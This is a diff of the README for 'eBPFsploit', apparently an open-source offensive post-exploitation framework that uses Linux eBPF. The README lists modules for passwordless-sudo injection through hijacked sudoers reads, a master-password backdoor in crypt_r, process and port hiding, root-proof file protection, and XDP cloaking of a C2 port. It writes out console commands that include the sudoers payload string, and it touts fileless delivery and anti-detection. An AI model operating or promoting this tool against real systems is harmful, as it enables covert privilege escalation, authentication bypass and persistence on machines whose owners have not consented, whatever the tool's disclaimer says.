@@ -19,6 +19,9 @@
 
 eBPFsploit is a modular post-exploitation framework that leverages Linux eBPF to perform **kernel-level** offensive operations — privilege escalation, credential hijacking, process/port hiding, file protection, and C2 communication stealth — all without kernel modules or disk artifacts.
 
+> [!IMPORTANT]
+> **Technical Note:** The `netghost` module is currently unavailable due to `EACCES` errors (BPF program complexity limits during verification). It is being refactored for future compatibility.
+
 > **⚠️ Disclaimer:** This tool is intended for **authorized security research and penetration testing only**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no liability for misuse.
 
 > **🚧 Development Status:** This project is currently **in active development** and has not undergone comprehensive testing. Functionality, stability, and compatibility are not guaranteed. Use at your own risk.
@@ -29,21 +32,44 @@ eBPFsploit is a modular post-exploitation framework that leverages Linux eBPF to
 
 | Module | Capability | Hook Type |
 |---|---|---|
-| **godmode** | Hijack sudoers reads → grant passwordless sudo | Tracepoint + `probe_write_user` |
-| **golden_key** | Universal master password via `crypt_r()` interception | uprobe / uretprobe |
-| **shadow_walker** | Hide processes from `ps`, `top`, `/proc` | Tracepoint (getdents64) |
-| **netghost** | Hide listening ports from `ss`, `netstat` | Tracepoint (proc/net/tcp) |
-| **guard** | Protect files & processes from rm/mv/kill (even root) | LSM BPF |
-| **stealth_link** | XDP-level C2 port cloaking with TCP RST spoofing | XDP |
+
+* **Stealthy C2 Communication**: Leverages **XDP (eXpress Data Path)** to hide the Agent's listening port. Only authorized IPs (the Console) can see the port; others receive a spoofed `TCP RST`, making the port appear `closed` rather than `filtered`.
+    ![XDP Stealth Enabled](src/01_xdp_enabled.png)
+    *Scan result with XDP stealth enabled (Port 4444 appears closed).*
+    ![XDP Stealth Disabled](src/02_xdp_disabled.png)
+    *Scan result with XDP stealth disabled (Port 4444 appears filtered/open depending on environment).*
+* **Privilege Escalation (`godmode`)**: Dynamically hijacks `sudoers` read streams to grant any user passwordless sudo access without modifying the actual `/etc/sudoers` file.
+    ![Godmode Loading](src/06_godmode.png)
+    *Loading the godmode module.*
+    ![Godmode Result](src/07_godmode.png)
+    *Achieving root privileges via sudoers hijacking.*
+    ![Godmode Verification](src/08_godmode.png)
+    *Hot-reconfiguring godmode parameters at runtime.*
+* **Credential Hijacking (`golden_key`)**: Hooks `libcrypt` to implement a master password, allowing authentication bypass on SSH/PAM-based services.
+    ![Golden Key interception](src/03_golden_key.png)
+    *Intercepting authentication flow.*
+    ![Golden Key analysis](src/04_golden_key.png)
+    *Analyzing intercepted credentials.*
+    ![Golden Key bypass](src/05_golden_key.png)
+    *Hot-reconfiguring the master password at runtime.*
+* **File/Process Persistence (`guard`)**: Uses **LSM BPF** to protect the Agent binary and processes. Even the `root` user cannot `kill`, `rm`, or `mv` the protected artifacts.
+    ![Guard Loading](src/09_guard.png)
+    *Loading the guard module.*
+    ![Guard Protection 1](src/10_guard.png)
+    *File protection active.*
+    ![Guard Protection 2](src/11_guard.png)
+    *Hot-reconfiguring protection targets: Attempting to delete protected files.*
+    ![Guard Protection 3](src/12_guard.png)
+    *Hot-reconfiguring protection targets: Process protection active.*
 
 **Framework Highlights:**
 
-- 🔌 **Fileless module delivery** — BPF bytecode transmitted over network, never touches disk
-- 👻 **Shadow Daemon persistence** — modules survive agent restarts via FD inheritance
-- 🔐 **Encrypted C2 channel** — PSK + XOR obfuscation, auto-generated per build
-- 🎯 **Runtime reconfiguration** — update BPF Maps on-the-fly without reloading
-- 🔍 **Auto recon** — environment capability scanning before module deployment
-- 🛡️ **Anti-detection** — per-build unique binary hash via `builder.py`
+* 🔌 **Fileless module delivery** — BPF bytecode transmitted over network, never touches disk
+* 👻 **Shadow Daemon persistence** — modules survive agent restarts via FD inheritance
+* 🔐 **Encrypted C2 channel** — PSK + XOR obfuscation, auto-generated per build
+* 🎯 **Runtime reconfiguration** — update BPF Maps on-the-fly without reloading
+* 🔍 **Auto recon** — environment capability scanning before module deployment
+* 🛡️ **Anti-detection** — per-build unique binary hash via `builder.py`
 
 ## 🏗️ Architecture
 
@@ -65,11 +91,11 @@ eBPFsploit is a modular post-exploitation framework that leverages Linux eBPF to
 
 ## 📋 Prerequisites
 
-- **Linux kernel ≥ 5.8** with BTF support (`CONFIG_DEBUG_INFO_BTF=y`)
-- **Root privileges** on the target machine
-- Build tools: `gcc`, `clang`, `bpftool`, `make`
-- Libraries: `libbpf-dev`, `libelf-dev`, `zlib1g-dev`
-- Python 3.8+ with `pyelftools`, `colorama`
+* **Linux kernel ≥ 5.8** with BTF support (`CONFIG_DEBUG_INFO_BTF=y`)
+* **Root privileges** on the target machine
+* Build tools: `gcc`, `clang`, `bpftool`, `make`
+* Libraries: `libbpf-dev`, `libelf-dev`, `zlib1g-dev`
+* Python 3.8+ with `pyelftools`, `colorama`
 
 ## 🔨 Build
 
@@ -129,13 +155,15 @@ python3 console/console.py 4444
 ebpfsploit > list                          # List available modules
 ebpfsploit > use godmode                   # Select module
 ebpfsploit (godmode) > show options        # View configuration
-ebpfsploit (godmode) > set TARGET_PAYLOAD "\nuser ALL=(ALL:ALL) NOPASSWD:ALL\n"
+ebpfsploit (godmode) > set target "\nuser ALL=(ALL:ALL) NOPASSWD:ALL\n"
 ebpfsploit (godmode) > run                 # Deploy to target kernel
 
 ebpfsploit > sessions                      # List active sessions
 ebpfsploit > show session 1                # View session details
-ebpfsploit > update 1 inject_payload "\nnewuser ALL=(ALL:ALL) NOPASSWD:ALL\n"
-ebpfsploit > unload 1                      # Remove module from kernel
+ebpfsploit > update 1 target "\nnewuser ALL=(ALL:ALL) NOPASSWD:ALL\n"
+ebpfsploit > unload 1                      # Remove module from kernel (alias: kill)
+ebpfsploit > kill 2                        # Close session 2
+ebpfsploit > update 1 target 80 443 8080   # Multiple value update (overwrites map)
 ebpfsploit > recon                         # Re-scan target environment
 ```
 
@@ -188,7 +216,7 @@ Hooks `openat` and `read` syscalls via tracepoints. When a process reads `/etc/s
 
 ```bash
 use godmode
-set TARGET_PAYLOAD "\nuser ALL=(ALL:ALL) NOPASSWD:ALL\n"
+set target "\nuser ALL=(ALL:ALL) NOPASSWD:ALL\n"
 run
 ```
 
@@ -203,7 +231,7 @@ Attaches uprobe/uretprobe to `crypt_r()` in `libcrypt.so.1`. When the master pas
 
 ```bash
 use golden_key
-set MASTER_PASSWORD "mysecretpass"
+set target "mysecretpass"
 run
 # Now log in with "mysecretpass" as any user's password
 ```
@@ -220,7 +248,7 @@ Hooks `getdents64` to manipulate directory entries returned from `/proc`. Target
 ```bash
 use shadow_walker
 run
-update <session_id> hidden_pids <pid_to_hide>
+update <session_id> target <pid_to_hide> <another_pid>
 ```
 
 </details>
@@ -235,7 +263,7 @@ Hooks reads on `/proc/net/tcp` and blanks out lines containing hidden ports. Too
 ```bash
 use netghost
 run
-update <session_id> hidden_ports 4444
+update <session_id> target 4444 80 22
 ```
 
 </details>
@@ -250,7 +278,8 @@ Uses LSM BPF hooks (`inode_permission`, `path_rename`, `path_unlink`, `task_kill
 ```bash
 use guard
 run
-update <session_id> protected_inodes <inode_number>
+update <session_id> target_inodes <inode1> <inode2>
+update <session_id> target_pids <pid1>
 ```
 
 </details>
@@ -265,10 +294,15 @@ XDP program that hides the Agent's listening port at the network driver level. U
 ```bash
 # Auto-loaded with -i flag:
 ./agent -b 4444 -i eth0
-# Or manually:
-use stealth_link
-set C2_PORT 4444
-run
+
+# Or manually via console:
+# use stealth_link
+# set target 4444
+# run
+# update <session_id> whitelist 1.2.3.4 5.6.7.8
+
+# In Bind mode: First console connection gets auto-whitelisted, then port locks down.
+# In Reverse mode: The target IP is auto-whitelisted from the start.
 ```
 
 </details>
